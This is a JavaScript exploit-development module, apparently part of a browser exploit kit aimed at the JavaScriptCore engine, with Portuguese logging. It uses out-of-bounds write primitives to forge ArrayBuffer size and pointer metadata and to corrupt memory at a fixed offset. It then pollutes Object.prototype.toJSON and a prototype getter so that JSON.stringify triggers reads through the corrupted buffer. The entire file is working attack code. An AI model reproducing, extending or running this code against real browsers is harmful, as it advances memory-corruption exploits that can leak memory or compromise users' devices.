// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let retype_getter_called_flag = false;
let retype_leak_attempt_results = { success: false, message: "Getter não chamado ou teste não iniciado.", error: null };

const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);
const TAMANHO_ESPERADO_SOMBRA = new AdvancedInt64(0x1000, 0x0); // 4096


class CheckpointObjectForRetype {
    constructor(id) {
        this.id = `RetypeCheckpoint-${id}`;
        this.marker = 0xD0D0D0D0;
    }
}

export function toJSON_TriggerRetypeCheckpointGetter() {
    const FNAME_toJSON = "toJSON_TriggerRetypeCheckpointGetter";
    logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' é: ${Object.prototype.toString.call(this)}, id: ${this?.id}, é CheckpointObject?: ${this instanceof CheckpointObjectForRetype}`, "info", FNAME_toJSON);
    if (this instanceof CheckpointObjectForRetype) {
        logS3(`toJSON_TriggerRetypeCheckpointGetter: 'this' É CheckpointObject. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
        } catch (e) {
            logS3(`toJSON_TriggerRetypeCheckpointGetter: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id; // Retorno simples
}


export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeRetypeOOB_AB_Test";
    logS3(`--- Iniciando Teste de "Re-Tipagem" do oob_array_buffer_real via ShadowCraft ---`, "test", FNAME_TEST);

    retype_getter_called_flag = false;
    retype_leak_attempt_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };

    // Validações de Config (mantidas)
    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets críticos não definidos em config.mjs. Abortando.", "critical", FNAME_TEST);
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            retype_leak_attempt_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(retype_leak_attempt_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}, oob_dv_len: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);

        const shadow_metadata_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, TAMANHO_ESPERADO_SOMBRA, 8);
        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, ENDERECO_INVALIDO_PARA_LEITURA_TESTE, 8);
        logS3(`Metadados sombra: ptr=${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}, size=${TAMANHO_ESPERADO_SOMBRA.toString(true)}`, "info", FNAME_TEST);

        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho: offset=${toHex(corruption_trigger_offset_abs)}, val=${corruption_value.toString(true)}`, "info", FNAME_TEST);

        const checkpoint_obj = new CheckpointObjectForRetype(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForRetype.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                retype_getter_called_flag = true;
                const FNAME_GETTER = "RetypeGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" foi CHAMADO em this.id = ${this?.id || 'N/A'}!`, "vuln", FNAME_GETTER);
                retype_leak_attempt_results = { success: false, message: "Getter chamado, teste de re-tipagem em andamento.", error: null };

                // Teste 1: DataView sobre oob_array_buffer_real
                let dv_byteLength_matches_shadow = false;
                try {
                    logS3("DENTRO DO GETTER (T1): DataView sobre oob_array_buffer_real...", "info", FNAME_GETTER);
                    const dv = new DataView(oob_array_buffer_real);
                    logS3(`DENTRO DO GETTER (T1): DV criada. ByteLength: ${dv.byteLength}. Esperado (sombra): ${TAMANHO_ESPERADO_SOMBRA.low()}`, "info", FNAME_GETTER);
                    if (dv.byteLength === TAMANHO_ESPERADO_SOMBRA.low()) {
                        dv_byteLength_matches_shadow = true;
                        logS3(`DENTRO DO GETTER (T1): SUCESSO ESPECULATIVO! ByteLength CORRESPONDE. Tentando ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}...`, "vuln", FNAME_GETTER);
                        const valLido = dv.getUint32(0, true); // Tenta ler de 0x1
                        retype_leak_attempt_results = { success: true, message: `Re-tipagem (T1) ByteLength OK, leitura de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} retornou ${toHex(valLido)} SEM ERRO.`, error: null};
                        logS3(`DENTRO DO GETTER (T1): Leitura de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)} retornou ${toHex(valLido)}.`, "leak", FNAME_GETTER);
                    } else {
                        retype_leak_attempt_results = { success: false, message: `Falha re-tipagem (T1). ByteLength (${dv.byteLength}) != esperado (${TAMANHO_ESPERADO_SOMBRA.low()}).`, error: null};
                    }
                } catch (e) {
                    logS3(`DENTRO DO GETTER (T1): ERRO DV sobre oob_ab: ${e.message}`, "error", FNAME_GETTER);
                    if (dv_byteLength_matches_shadow && (String(e.message).toLowerCase().includes("rangeerror") || String(e.message).toLowerCase().includes("memory access"))) {
                        retype_leak_attempt_results = { success: true, message: `Re-tipagem (T1) ByteLength OK, CRASH CONTROLADO '${e.message}' ao ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE.toString(true)}.`, error: String(e) };
                        logS3(`DENTRO DO GETTER (T1): O erro '${e.message}' é o CRASH CONTROLADO esperado!`, "vuln", FNAME_GETTER);
                    } else {
                         retype_leak_attempt_results = { success: false, message: `Erro inesperado (T1): ${e.message}`, error: String(e) };
                    }
                }

                // Teste 2: Operações diretas no oob_array_buffer_real para ver se ele está "confuso"
                try {
                    logS3("DENTRO DO GETTER (T2): Tentando acessar oob_array_buffer_real.byteLength...", "info", FNAME_GETTER);
                    const len = oob_array_buffer_real.byteLength; // Acesso normal
                    logS3(`DENTRO DO GETTER (T2): oob_array_buffer_real.byteLength (acesso normal): ${len}`, "info", FNAME_GETTER);

                    logS3("DENTRO DO GETTER (T2): Tentando oob_array_buffer_real.slice(0, 4)...", "info", FNAME_GETTER);
                    const slice = oob_array_buffer_real.slice(0, 4); // Operação comum
                    logS3(`DENTRO DO GETTER (T2): oob_array_buffer_real.slice(0, 4) byteLength: ${slice.byteLength}`, "info", FNAME_GETTER);
                    const sliceDV = new DataView(slice);
                    logS3(`DENTRO DO GETTER (T2): Valor do slice[0] (u32): ${toHex(sliceDV.getUint32(0,true))}`, "info", FNAME_GETTER);

                    // Tentativa mais "estranha"
                    logS3("DENTRO DO GETTER (T2): Tentando acessar oob_array_buffer_real['non_existent_prop']...", "info", FNAME_GETTER);
                    const non_existent = oob_array_buffer_real['non_existent_prop'];
                    logS3(`DENTRO DO GETTER (T2): oob_array_buffer_real['non_existent_prop'] retornou: ${non_existent}`, "info", FNAME_GETTER);

                    if (len !== TAMANHO_ESPERADO_SOMBRA.low() && !retype_leak_attempt_results.success) { // Se o T1 falhou
                        // Não necessariamente uma falha se o T1 já era o foco, mas indica que o AB em si não mudou seu tamanho visível.
                        // retype_leak_attempt_results.message += "; T2: oob_ab.byteLength original.";
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER (T2): ERRO ao operar em oob_array_buffer_real: ${e.message}`, "error", FNAME_GETTER);
                    if (!retype_leak_attempt_results.success) { // Se T1 falhou e T2 causou erro
                        retype_leak_attempt_results.message += `; T2 ERRO: ${e.message}`;
                        retype_leak_attempt_results.error = String(e);
                    }
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerRetypeCheckpointGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        retype_leak_attempt_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
    } finally {
        // Restauração (mantida)
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { /* ... */ }
        if (getterPollutionApplied && CheckpointObjectForRetype.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { /* ... */ }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    // Log final (mantido)
    if (retype_getter_called_flag) { /* ... */ } else { /* ... */ }
    logS3(`  Detalhes finais: ${JSON.stringify(retype_leak_attempt_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste ShadowCraft Concluído ---`, "test", FNAME_TEST);
}
